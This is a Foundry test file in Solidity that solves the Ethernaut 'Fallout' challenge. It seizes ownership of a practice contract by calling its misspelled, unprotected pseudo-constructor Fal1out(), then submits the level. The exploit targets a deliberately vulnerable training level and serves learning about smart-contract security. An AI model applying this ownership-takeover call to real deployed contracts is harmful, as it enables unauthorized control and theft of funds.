// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

interface IFallout {
  function Fal1out() external payable;
}

contract FalloutTest is Test {
  address internal challengeAddress;
  IFallout internal challenge;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x0AA237C34532ED79676BCEa22111eA2D01c3d3e7);
    challenge = IFallout(challengeAddress);
  }

  function testExploit() public {
    // meh... mispelled function
    challenge.Fal1out();

    utils.submitLevelInstance(challengeAddress);
  }
}
